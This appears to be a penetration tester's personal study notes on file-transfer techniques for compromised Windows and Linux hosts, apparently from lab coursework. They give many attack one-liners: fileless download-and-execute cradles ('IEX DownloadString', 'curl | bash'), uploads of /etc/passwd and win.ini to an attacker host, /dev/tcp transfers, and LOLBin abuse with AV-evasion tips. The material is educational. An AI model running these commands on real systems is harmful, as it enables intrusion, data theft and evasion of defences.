---
title: File Transfer
published: 2025-03-28
description: For My Reference
tags: [Notes]
category: Notes
author: Me
draft: false
---


# 5 - File Transfer

### Windows File Transfer Methods

### Real-World Scenario

- **Context**: During a penetration test, remote code execution (RCE) was achieved on an IIS web server through an unrestricted file upload vulnerability.
    - Initial access: Uploaded a web shell.
    - Next step: Established a reverse shell for system enumeration to escalate privileges.
- **Goal**: Transfer the `PrintSpoofer` binary to exploit `SeImpersonatePrivilege` and gain administrator-level access.
- **Attempts and Solutions**:
    - **PowerShell**: Blocked by an Application Control Policy, preventing script execution.
    - **Certutil**: Attempted to download a compiled binary from GitHub, but strong web content filtering blocked access to external sites (GitHub, Dropbox, Google Drive).
    - **FTP**: Set up an FTP server, but the network firewall blocked outbound traffic on port 21 (TCP).
    - **SMB**: Discovered outbound traffic to TCP port 445 (SMB) was allowed. Used `impacket-smbserver` to host the binary and successfully transferred it to the target, enabling privilege escalation.

### Detailed Techniques

1. **Base64 Encode/Decode**
    - **Use Case**: Transfer small files without network reliance, using a terminal or shell.
    - **Process**:
        - **Source (Pwnbox)**:
            - Check hash: `md5sum id_rsa` → `4e301756a07ded0a2dd6953abf015278`.
            - Encode: `cat id_rsa | base64 -w 0; echo` → Outputs a single-line Base64 string (e.g., `LS0tLS1CRUd...`).
        - **Target (Windows)**:
            - Decode: `PS C:\\htb> [IO.File]::WriteAllBytes("C:\\Users\\Public\\id_rsa", [Convert]::FromBase64String("<base64>"))`.
            - Verify: `PS C:\\htb> Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm MD5` → Ensure hash matches.
    - **Reverse (Upload)**: Encode on Windows with `[Convert]::ToBase64String((Get-Content -Path "<file>" -Raw))`, decode on Pwnbox with `echo "<base64>" | base64 -d > <file>`.
    - **Advantages**: No network required; works in restricted environments with terminal access.
    - **Limitations**:
        - CMD max string length: ~8,191 characters (PowerShell is less restrictive).
        - Large files may fail in web shells due to buffer limits.
    - **Tip**: Use for small binaries or scripts (e.g., SSH keys, configuration files).
2. **PowerShell Web Downloads**
    - **Context**: HTTP/HTTPS (ports 80/443) are often allowed outbound, making web downloads viable.
    - **Tools**: PowerShell’s `Net.WebClient` class or `Invoke-WebRequest` (PowerShell 3.0+).
    - **Methods**:
        - **DownloadFile**:
            - Command: `(New-Object Net.WebClient).DownloadFile('https://<URL>', 'C:\\htb\\file.exe')`.
            - Use: Downloads directly to disk.
        - **DownloadString (Fileless)**:
            - Command: `IEX (New-Object Net.WebClient).DownloadString('https://<URL>')`.
            - Use: Executes scripts in memory, avoiding disk writes (useful against AV).
        - **Invoke-WebRequest**:
            - Command: `Invoke-WebRequest https://<URL> -OutFile C:\\htb\\file.exe`.
            - Aliases: `iwr`, `curl`, `wget`.
            - Note: Slower than `Net.WebClient`.
    - **Bypasses**:
        - **IE First-Launch Error**: Add `UseBasicParsing` (e.g., `Invoke-WebRequest <URL> -UseBasicParsing | IEX`).
        - **SSL/TLS Error**: Bypass untrusted certificates with `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`.
    - **Pitfalls**:
        - Web filtering may block specific domains or file types (e.g., `.exe`).
        - Proxy-unaware methods may fail in corporate environments.
    - **Tip**: Check Harmjoy’s PowerShell download cradles for situational variations.
3. **SMB Downloads**
    - **Context**: SMB (TCP/445) is common in Windows enterprise networks for file sharing.
    - **Setup (Pwnbox)**: `sudo impacket-smbserver share -smb2support /tmp/smbshare`.
    - **Download (Windows)**: `copy \\\\<Pwnbox-IP>\\share\\nc.exe C:\\htb\\`.
    - **Authentication**:
        - If guest access is blocked: `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -p test`.
        - Mount: `net use n: \\\\<IP>\\share /user:test test`, then `copy n:\\nc.exe`.
    - **Advantages**: Fast, leverages native Windows functionality.
    - **Pitfalls**: Newer Windows versions block unauthenticated access; outbound SMB may be restricted.
    - **Tip**: Use with caution—SMB traffic is often monitored.
4. **FTP Downloads**
    - **Setup (Pwnbox)**: `sudo pip3 install pyftpdlib; sudo python3 -m pyftpdlib --port 21`.
    - **Methods**:
        - **PowerShell**: `(New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', 'C:\\htb\\file.txt')`.
        - **FTP Client (Non-Interactive)**:
            - Create `ftpcommand.txt`:
                
                ```
                open <IP>
                USER anonymous
                binary
                GET file.txt
                bye
                
                ```
                
            - Run: `ftp -v -n -s:ftpcommand.txt`.
    - **Advantages**: Simple setup, anonymous access by default.
    - **Pitfalls**: FTP (TCP/21) often blocked; lacks encryption unless FTPS is used.
    - **Tip**: Use for quick transfers in permissive networks.
5. **Uploads**
    - **Base64**:
        - Encode: `[Convert]::ToBase64String((Get-Content -Path "C:\\Windows\\system32\\drivers\\etc\\hosts" -Raw))`.
        - Decode on Pwnbox: `echo "<base64>" | base64 -d > hosts`.
    - **Web**:
        - Setup: `pip3 install uploadserver; python3 -m uploadserver` (Pwnbox, port 8000).
        - Upload: `Invoke-FileUpload -Uri http://<IP>:8000/upload -File C:\\htb\\file.txt` (requires PSUpload.ps1 script).
    - **FTP**: Use `PUT` in `ftpcommand.txt` (e.g., `PUT C:\\htb\\file.txt`).
    - **Tip**: Verify with hashes (e.g., `Get-FileHash` vs. `md5sum`).
6. **WebDAV (SMB over HTTP)**
    - **Setup (Pwnbox)**: `sudo pip3 install wsgidav cheroot; sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`.
    - **Access (Windows)**: `dir \\\\<IP>\\DavWWWRoot`, `copy C:\\htb\\file.txt \\\\<IP>\\DavWWWRoot\\`.
    - **Advantages**: Bypasses SMB restrictions by using HTTP (TCP/80).
    - **Pitfalls**: Requires Python modules; inbound HTTP must be allowed.
    - **Tip**: Ideal when SMB is blocked but HTTP is open.

---

### Linux File Transfer Methods

### Real-World Scenario

- **Context**: Incident response on compromised web servers (6/9 affected) via SQL injection.
    - Attack: Bash script attempted malware download using:
        1. `cURL`
        2. `wget`
        3. Python (HTTP-based fallback).
    - Purpose: Deliver payload connecting to a command-and-control (C2) server.
- **Insight**: HTTP/HTTPS is favored by malware; defenders must monitor these protocols.

### Detailed Techniques

1. **Base64 Encode/Decode**
    - **Process**:
        - Encode: `cat id_rsa | base64 -w 0; echo` → `LS0tLS1CRUd...`.
        - Decode: `echo -n '<base64>' | base64 -d > id_rsa`.
        - Verify: `md5sum id_rsa` → `4e301756a07ded0a2dd6953abf015278`.
    - **Reverse (Upload)**: Encode on target, decode on Pwnbox.
    - **Advantages**: No network dependency; works in air-gapped scenarios.
    - **Tip**: Use `n` with `echo` to avoid trailing newline issues.
2. **Web Downloads**
    - **wget**: `wget https://<URL> -O /tmp/file`.
    - **cURL**: `curl -o /tmp/file https://<URL>`.
    - **Fileless**:
        - `curl https://<URL> | bash`.
        - `wget -qO- https://<URL> | python`.
    - **Advantages**: Common tools, widely available.
    - **Pitfalls**: Blocked by egress filtering or missing on minimal systems.
    - **Tip**: Use fileless execution to evade disk-based detection.
3. **Bash (/dev/tcp)**
    - **Use Case**: No wget/cURL, Bash 2.04+ with `-enable-net-redirections`.
    - **Process**:
        - Connect: `exec 3<>/dev/tcp/<IP>/<Port>`.
        - Request: `echo -e "GET /file HTTP/1.1\\n\\n" >&3`.
        - Retrieve: `cat <&3`.
    - **Advantages**: Minimal dependencies; built into Bash.
    - **Pitfalls**: Requires specific Bash compilation; raw HTTP response includes headers.
    - **Tip**: Pipe output to `tail` or `grep` to clean up.
4. **SSH/SCP**
    - **Setup (Pwnbox)**:
        - Enable: `sudo systemctl enable ssh`.
        - Start: `sudo systemctl start ssh`.
        - Verify: `netstat -lnpt` (check TCP/22).
    - **Download**: `scp <user>@<IP>:/path/to/file /local/path`.
    - **Upload**: `scp /local/file <user>@<IP>:/remote/path`.
    - **Advantages**: Secure, encrypted transfers.
    - **Pitfalls**: Requires SSH server and credentials; TCP/22 may be blocked.
    - **Tip**: Use temporary accounts for security.
5. **Uploads**
    - **Web with uploadserver**:
        - Install: `pip3 install uploadserver`.
        - Cert: `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048`.
        - Run: `python3 -m uploadserver 443 --server-certificate /server.pem`.
        - Upload: `curl -X POST https://<IP>/upload -F 'files=@/etc/passwd' --insecure`.
    - **Simple Web Servers**:
        - Python3: `python3 -m http.server 8000`.
        - Python2: `python2.7 -m SimpleHTTPServer 8000`.
        - PHP: `php -S 0.0.0.0:8000`.
        - Ruby: `ruby -run -e httpd . -p8000`.
        - Download from Pwnbox: `wget <IP>:8000/<file>`.
    - **Advantages**: Flexible, lightweight options.
    - **Pitfalls**: Inbound traffic to non-standard ports may be blocked.
    - **Tip**: Move files to an existing web server directory if available.

---

### Transferring Files with Programming Languages

### Overview

- **Context**: Programming languages like Python, PHP, Perl, Ruby, JavaScript, and VBScript are often available on target systems and can be repurposed for file transfers.
- **Advantage**: One-liners or short scripts can bypass restrictions where traditional tools (e.g., wget, PowerShell) are blocked.

### Python

- **Availability**: Common on Linux; less so on Windows unless installed. Python 2.7 (legacy) and Python 3.x (current) differ slightly in syntax.
- **Execution**: Use `c` flag for one-liners from the command line.
- **Examples**:
    - **Download (Python 2.7)**:
        - `python2.7 -c 'import urllib; urllib.urlretrieve("<https://raw.githubusercontent.com/><path>", "file")'`.
        - Downloads a file from a URL to the specified local path.
    - **Download (Python 3)**:
        - `python3 -c 'import urllib.request; urllib.request.urlretrieve("<https://raw.githubusercontent.com/><path>", "file")'`.
        - Updated module (`urllib.request`) for Python 3 compatibility.
    - **Upload (Python 3 with `requests`)**:
        - Setup server: `python3 -m uploadserver` (runs on port 8000).
        - One-liner: `python3 -c 'import requests; requests.post("http://<IP>:8000/upload", files={"files": open("/etc/passwd", "rb")})'`.
        - Breakdown:
            - Import `requests` module.
            - Open file in binary mode (`rb`).
            - Send POST request with file attached.
- **Pitfalls**: Requires Python and relevant modules (e.g., `requests` for uploads); blocked by strict egress filtering.
- **Tip**: Verify file integrity with `md5sum` post-transfer.

### PHP

- **Availability**: Prevalent on web servers (77.4% of known server-side languages per W3Techs).
- **Execution**: Use `r` flag for one-liners.
- **Examples**:
    - **Download with `file_get_contents()`**:
        - `php -r '$file = file_get_contents("<https://raw.githubusercontent.com/><path>"); file_put_contents("file", $file);'`.
        - Fetches content and writes it to a local file.
    - **Download with `fopen()`**:
        - `php -r 'const BUFFER = 1024; $fremote = fopen("<https://raw.githubusercontent.com/><path>", "rb"); $flocal = fopen("file", "wb"); while (!feof($fremote)) { fwrite($flocal, fread($fremote, BUFFER)); } fclose($fremote); fclose($flocal);'`.
        - Streams content in chunks (1024 bytes) for efficiency.
    - **Fileless Execution**:
        - `php -r '$lines = @file("<https://raw.githubusercontent.com/><path>"); foreach($lines as $line) { echo $line; }' | bash`.
        - Pipes downloaded content to Bash (requires `fopen` wrappers enabled).
- **Pitfalls**: Requires PHP CLI; web filters may block URLs.
- **Tip**: Use `@` to suppress errors if URL access fails.

### Ruby

- **Availability**: Common on Linux, less so on Windows.
- **Execution**: Use `e` flag for one-liners.
- **Example**:
    - **Download**:
        - `ruby -e 'require "net/http"; File.write("file", Net::HTTP.get(URI("<https://raw.githubusercontent.com/><path>")))'`.
        - Uses `net/http` library to fetch and write content.
- **Pitfalls**: Requires Ruby and internet access.
- **Tip**: Compact and stealthy for simple downloads.

### Perl

- **Availability**: Common on Linux, occasionally on Windows.
- **Execution**: Use `e` flag for one-liners.
- **Example**:
    - **Download**:
        - `perl -e 'use LWP::Simple; getstore("<https://raw.githubusercontent.com/><path>", "file")'`.
        - Uses `LWP::Simple` module for straightforward downloads.
- **Pitfalls**: Requires `LWP::Simple`; older systems may lack it.
- **Tip**: Reliable for legacy environments.

### JavaScript (Windows)

- **Availability**: Runs via `cscript.exe` (default on Windows).
- **Execution**: Save script as `.js` and execute with `cscript.exe /nologo <script.js> <URL> <output>`.
- **Example**:
    - **Script (`wget.js`)**:
        
        ```jsx
        var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        WinHttpReq.Open("GET", WScript.Arguments(0), false);
        WinHttpReq.Send();
        BinStream = new ActiveXObject("ADODB.Stream");
        BinStream.Type = 1; // Binary
        BinStream.Open();
        BinStream.Write(WinHttpReq.ResponseBody);
        BinStream.SaveToFile(WScript.Arguments(1));
        
        ```
        
    - **Command**: `cscript.exe /nologo wget.js https://<URL> C:\\path\\to\\file`.
- **Pitfalls**: Windows-only; requires ActiveX support.
- **Tip**: Useful when PowerShell is restricted.

### VBScript (Windows)

- **Availability**: Default on Windows since Windows 98.
- **Execution**: Save as `.vbs` and run with `cscript.exe /nologo <script.vbs> <URL> <output>`.
- **Example**:
    - **Script (`wget.vbs`)**:
        
        ```
        Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
        Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
        xHttp.Open "GET", WScript.Arguments.Item(0), False
        xHttp.Send
        With bStrm
            .Type = 1 ' Binary
            .Open
            .Write xHttp.ResponseBody
            .SaveToFile WScript.Arguments.Item(1), 2 ' Overwrite
        End With
        
        ```
        
    - **Command**: `cscript.exe /nologo wget.vbs https://<URL> C:\\path\\to\\file`.
- **Pitfalls**: Windows-only; may trigger AV.
- **Tip**: Stealthy alternative to PowerShell.

---

### Living off the Land (LOLBins and GTFOBins)

### Overview

- **Definition**: "Living off the Land" (LotL) involves using native system binaries to perform unintended actions (e.g., file transfers), coined by Campbell and Graeber at DerbyCon 3.
- **Resources**:
    - **LOLBAS**: Windows binaries/scripts/libraries ([lolbas-project.github.io](http://lolbas-project.github.io/)).
    - **GTFOBins**: Linux/Unix binaries ([gtfobins.github.io](http://gtfobins.github.io/)).
- **Functions**: Downloads, uploads, command execution, file read/write, bypasses.

### Windows LOLBins (LOLBAS)

- **CertReq.exe**:
    - **Upload**:
        - Command: `certreq.exe -Post -config http://<IP>:<port>/ C:\\windows\\win.ini`.
        - Listener (Pwnbox): `sudo nc -lvnp 8000`.
        - Result: Sends file content to Netcat session (copy-paste to save).
    - **Pitfalls**: Older versions lack `Post`; may timeout (error 0x80072ee2).
    - **Tip**: Use updated version if needed (download from Microsoft).
- **Certutil.exe**:
    - **Download**:
        - Command: `certutil.exe -verifyctl -split -f http://<IP>:<port>/file.exe`.
        - Saves file locally (e.g., `nc.exe`).
    - **Pitfalls**: Detected by AMSI as malicious; web filtering may block.
    - **Tip**: Encode URL to evade detection.
- **Bitsadmin**:
    - **Download**:
        - Command: `bitsadmin /transfer wcb /priority foreground http://<IP>:<port>/file.exe C:\\path\\to\\file.exe`.
        - Uses BITS (Background Intelligent Transfer Service) for efficient downloads.
    - **Pitfalls**: Requires outbound HTTP/SMB; may be logged.
    - **Tip**: Adjust priority (e.g., `normal`) to reduce impact.
- **PowerShell BITS**:
    - **Download**:
        - Command: `Import-Module bitstransfer; Start-BitsTransfer -Source "http://<IP>:<port>/file.exe" -Destination "C:\\path\\to\\file.exe"`.
        - Supports credentials/proxy if needed.
    - **Pitfalls**: PowerShell restrictions may apply.
    - **Tip**: Stealthier than `certutil`.

### Linux GTFOBins

- **curl**:
    - **Download**: `curl -o file https://<URL>`.
    - **Pitfalls**: Blocked by egress filtering.
    - **Tip**: Common and lightweight.
- **wget**:
    - **Download**: `wget -O file https://<URL>`.
    - **Pitfalls**: Similar to curl; may be absent on minimal systems.
    - **Tip**: Use `q` for quiet operation.
- **bash**:
    - **Download**: `cat < /dev/tcp/<IP>/<port> > file`.
    - Requires Netcat listener: `nc -l -p <port> < file`.
    - **Pitfalls**: Needs Bash with net-redirections enabled.
    - **Tip**: No external tools required.

### Tips

- **Obscurity**: Explore lesser-known binaries (e.g., `ConfigSecurityPolicy.exe`, `ab`) for stealth.
- **Practice**: Experiment with LOLBAS/GTFOBins to build familiarity.

---

### Miscellaneous File Transfer Methods

### Netcat/Ncat

- **Overview**: Netcat (nc) and Ncat (modern version) are versatile for TCP/UDP file transfers.
- **Availability**: Common on Linux; Ncat adds SSL, IPv6 support.
- **Examples**:
    - **Compromised Machine Listens**:
        - Netcat: `nc -l -p 8000 > SharpKatz.exe`.
        - Ncat: `ncat -l -p 8000 --recv-only > SharpKatz.exe`.
        - Attack Host Sends: `ncat -q 0 <IP> 8000 < SharpKatz.exe` or `ncat --send-only <IP> 8000 < SharpKatz.exe`.
    - **Attack Host Listens**:
        - Netcat: `nc -l -p 443 -q 0 < SharpKatz.exe`.
        - Ncat: `ncat -l -p 443 --send-only < SharpKatz.exe`.
        - Compromised Machine Connects: `nc <IP> 443 > SharpKatz.exe` or `ncat <IP> 443 --recv-only > SharpKatz.exe`.
    - **Bash /dev/tcp**:
        - Attack Host: `nc -l -p 443 -q 0 < SharpKatz.exe`.
        - Compromised Machine: `cat < /dev/tcp/<IP>/443 > SharpKatz.exe`.
- **Pitfalls**: Firewalls may block ports; Ncat requires installation if missing.
- **Tip**: Use `-send-only`/`-recv-only` to ensure clean termination.

### PowerShell Remoting (WinRM)

- **Overview**: Uses WinRM (TCP/5985 HTTP, TCP/5986 HTTPS) for remote file transfers.
- **Requirements**: Administrative access or Remote Management Users group membership.
- **Steps**:
    - Verify connectivity: `Test-NetConnection -ComputerName <target> -Port 5985`.
    - Create session: `$Session = New-PSSession -ComputerName <target>`.
    - Download: `Copy-Item -Path "C:\\local\\file.txt" -ToSession $Session -Destination "C:\\remote\\path"`.
    - Upload: `Copy-Item -Path "C:\\remote\\file.txt" -FromSession $Session -Destination "C:\\local\\path"`.
- **Pitfalls**: Requires WinRM enabled; blocked if HTTP/SMB is restricted.
- **Tip**: Ideal for internal Windows networks.

### RDP (Remote Desktop Protocol)

- **Overview**: Native Windows remote access; supports file transfers via copy-paste or drive mounting.
- **Methods**:
    - **Copy-Paste**: Right-click copy from source, paste in RDP session.
    - **Drive Mounting (Linux)**:
        - `rdesktop <IP> -u <user> -p <pass> -r disk:linux=/path/to/folder`.
        - `xfreerdp /v:<IP> /u:<user> /p:<pass> /drive:linux,/path/to/folder`.
    - **Drive Mounting (Windows)**:
        - `mstsc.exe` → "Local Resources" → Select drive → Connect.
- **Pitfalls**: Copy-paste may fail across OSes; drive access is session-specific.
- **Tip**: Use for quick, GUI-based transfers.

### OpenSSL (Bonus Method)

- **Overview**: Uses SSL/TLS for secure file transfers.
- **Steps**:
    - Create certificate: `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`.
    - Server (Pwnbox): `openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < file`.
    - Client (Compromised): `openssl s_client -connect <IP>:80 -quiet > file`.
- **Pitfalls**: Requires OpenSSL; complex setup.
- **Tip**: Encrypts transfers, evading some detection.

---

### Key Takeaways

- **Programming Languages**: Python, PHP, Ruby, Perl, JS, and VBScript offer flexible one-liners or scripts for file transfers across platforms.
- **LOLBins/GTFOBins**: Native binaries like `certreq`, `certutil`, `curl`, and `bash` minimize footprint and bypass tool restrictions.
- **Miscellaneous**: Netcat/Ncat, PowerShell Remoting, RDP, and OpenSSL provide versatile options for varied scenarios.
- **Adaptability**: Test multiple methods; environments differ in restrictions.
- **Verification**: Use `md5sum` or `Get-FileHash` to ensure integrity.
- **Practice**: Build muscle memory with labs (e.g., Active Directory Enumeration, Pivoting, Shells & Payloads).

---